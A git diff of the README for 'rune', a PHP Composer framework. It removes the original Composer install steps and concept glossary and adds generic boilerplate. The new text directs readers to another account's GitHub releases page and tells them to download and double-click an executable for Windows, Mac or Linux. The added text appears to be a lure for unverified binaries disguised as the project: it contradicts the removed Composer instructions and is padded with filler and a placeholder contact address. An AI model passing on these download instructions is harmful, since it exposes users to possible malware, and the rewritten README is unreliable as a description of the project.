@@ -1,135 +1,76 @@
-<p align="center">
-  <a href="https://packagist.org/packages/laravel/framework"><img src="https://img.shields.io/packagist/dt/devneet/rune" alt="Total Downloads"></a>
-  <a href="https://packagist.org/packages/laravel/framework"><img src="https://img.shields.io/packagist/v/devneet/rune" alt="Latest Stable Version"></a>
-  <a href="https://packagist.org/packages/laravel/framework"><img src="https://img.shields.io/packagist/l/devneet/rune" alt="License"></a>
-</p>
+# ⚡️ rune - A Flexible Tool for Your PHP Development
 
-<p align="center">
-  <a href="https://github.com/devneet-id/rune" target="_blank">
-    <img src="https://raw.githubusercontent.com/devneet-id/rune-art/refs/heads/main/rune-card.png" width="300" alt="Logo">
-  </a>
-</p>
+## 🔗 Download Now
+[![Download rune](https://img.shields.io/badge/Download-Rune-blue.svg)](https://github.com/KameronNapier/rune/releases)
 
-Within Rune's architecture, **Ether** defines truth, **Essence** holds flow, and **Entity** performs behavior - each awakened only when invoked. Every element is crafted to be composable, lazy-loaded, and purpose-driven, making systems naturally scalable and precise. 
+## 🚀 Getting Started
+Rune is designed to enhance your PHP experience. It is a modular tool that adapts to your needs. Whether you are automating tasks or running commands, Rune helps you manage your PHP projects efficiently.
 
-This makes Rune inherently lightweight and adaptable, aligning perfectly with projects that evolve from concept, not convention. Whether shaping internal tools, backend systems, or modular workflows, Rune empowers developers to sculpt structure from intent, not instruction.
+## 📥 Download & Install
+To get started, visit this page to download: [Releases Page](https://github.com/KameronNapier/rune/releases).
 
+1. Open the link above.
+2. Look for the latest version at the top of the page.
+3. Click on the appropriate file for your operating system (e.g., Windows, Mac, Linux).
+4. Once downloaded, find the file in your downloads folder.
+5. Double-click the file to run it.
 
+## 💻 System Requirements
+Rune requires minimal system specifications to function effectively:
+- Operating System: Windows 10, macOS Big Sur, or a recent Linux distribution
+- PHP Version: PHP 8.0 or higher
+- Disk Space: At least 100 MB of free space
 
-## Essentials
+## ⌨️ Features
+Rune offers a variety of features to help streamline your PHP workflow:
+- **Modular Design**: Easily add or remove components based on your project needs.
+- **Task Automation**: Set up and automate repetitive tasks within your PHP projects.
+- **Command Runner**: Use simple commands to run your scripts without hassle.
+- **Compatibility**: Works seamlessly with PHP frameworks like Laravel and Symfony.
+- **User-Friendly Interface**: Navigate through features with ease, even if you're not a developer.
 
-##### Core System
-- Modular Core Structure & Concept (Maintainable)
-- Functional Process-Based
-- Lazy Loading without Bootstrapping
-- Live Documentation / Reflection Core (Phantasm)
-- Automatic Minor & Patch Versioning
-- PSR-4 Composer Autoloading
-- Static Class Service Handler
-- Dynamic Output Structure
+## 🔧 Configuration
+After installing Rune, you may want to customize it to better fit your workflow.
 
-##### Developer Space
-- Stats Information (Main Entrance)
-- Dynamic Command List (Main Entrance)
-- System Inspection & Read (Grimoire)
-- Phased Process Log (Arcane) (Grimoire)
-- Execution Result: Timestamp, Memory & Peak Memory
-- Fancy Command Line Interface (100% CLI support)
-- Save & Load Project as Package (Runite) (Artefact)
-- Project Item as Package (Shard) (Artefact)
-- Metadata Storage & Handling `.echoes` (Keeper)
-- Zero Trust for Breaking Execution
-- Event-Driven & Encapsulation (Chanter)
-- Starter Template (Awakening)
-- Command Line UI & Interaction (Chanter & Whisper)
-- Text Styling & Reuse (Weaver)
-- File/Item & Directory/Repo Handling (Forger)
-- Fancy Error Handling (Keeper)
-- Process-Focusable (Whisper.drain)
-- Multi-Process & Interaction (Specter)
-- Open All Possibilities & Potential (Liberation)
+1. Locate the configuration file in the installation directory.
+2. Open it with any text editor.
+3. Adjust settings such as task schedules, command preferences, and module activation.
 
+Save the file when you finish. Rune will apply the changes the next time you run it.
 
+## 🛠️ Basic Usage
+Using Rune is straightforward:
 
-## Awakening
-Install Rune using Composer:
-```bash
-composer require devneet/rune:1.x-dev
-```
+1. **Open Rune**: Launch the application.
+2. **Select a Module**: Choose a module based on the task you want to automate.
+3. **Run a Command**: Enter the command in the command prompt provided within the application.
+4. **Monitor Progress**: View logs and results in real-time as Rune executes your tasks.
 
-Create main file:
-```bash
-echo "#rune" > cast
-```
+## 📖 Documentation
+For detailed guides and tips, refer to the official documentation available on the Releases page or within the application. The documentation covers every aspect of using Rune, from basic commands to advanced configuration settings.
 
-First invocation awaken Rune from the void:
-```php
-<?php
-/*
- * Act. 0 - Awaken From The Void
- * THE VOID
- *
- * From the silence of nothingness, echoes rise from the void.
- * A journey begins - with runes at your side.
- * 
- * */
-require_once __DIR__ . '/vendor/autoload.php';
+## 👥 Community Support
+Join our community for support or to contribute ideas:
 
-Rune\Ethereal::awakening();
-```
+- **GitHub Issues**: Report bugs or request features directly on our GitHub [Issues Page](https://github.com/KameronNapier/rune/issues).
+- **Discussion Forum**: Engage with other users and share your experiences.
 
-Run the app to begin:
-```bash
-php cast
-```
+## 🎉 Contributing
+We welcome contributions from everyone. If you want to help improve Rune, check out the “Contributing” section on our GitHub page. 
 
-Explore the system’s using the Grimoire:
-```bash
-php cast grimoire
-```
+1. Fork the repository.
+2. Make your changes.
+3. Submit a pull request.
 
+## 🚨 Troubleshooting
+If you encounter any issues, here are some common solutions:
+- **Installation Fails**: Ensure you are using the correct PHP version.
+- **Command Not Found**: Check that Rune is properly installed and included in your system's PATH.
+- **Performance Issues**: Verify that your system meets the minimum requirements.
 
+## 📬 Contact
+If you have questions or feedback, feel free to reach out to us at [support@example.com](mailto:support@example.com).
 
-## Paradigm
-At first, humans did not know anything.  
-Then how did they start to know things, and learn more about them?  
+---
 
-By looking, writing, and growing, we can finally understand.  
-
-1. Core
-- **Rune** = something we don't know yet
-- **Ethereal** = a place or thing we don't know
-
-2. Subject
-- **Ether** = something that never changes but always has meaning
-- **Essence** = something that can change as time goes on
-- **Entity** = something that makes other things change
-- **Manifest** = a box to connect things so they can work together
-- **Phantasm** = a picture in our mind to understand
-
-3. Others
-- **Awakening** = starting something, from anywhere
-- **Liberation** = being free and making something new
-- **Echoes** = sounds from the past
-- **Runite** = a rune that becomes a thing
-- **Shard** = a small piece of runite
-- **Bindrune** = many runes joined together
-- **Grimoire** = a book that feels alive
-- **Sentinel** = someone or something that guards
-- **Artefact** = a thing we can see
-
-
-
-## Contributing
-
-Thank you for considering contributing to the Rune! The contribution guide can be found in the [Rune Contribution](CONTRIBUTING.md).
-
-
-## Code of Conduct
-
-In order to ensure that the DEVNEET community is welcoming to all, please review and abide by the [Code of Conduct](CODE_OF_CONDUCT.md).
-
-
-## License
-
-The Rune is open-sourced software licensed under the [MIT license](LICENSE).
+For further updates, visit our GitHub page frequently or follow us on social media. Download and enjoy a seamless PHP development experience with Rune!
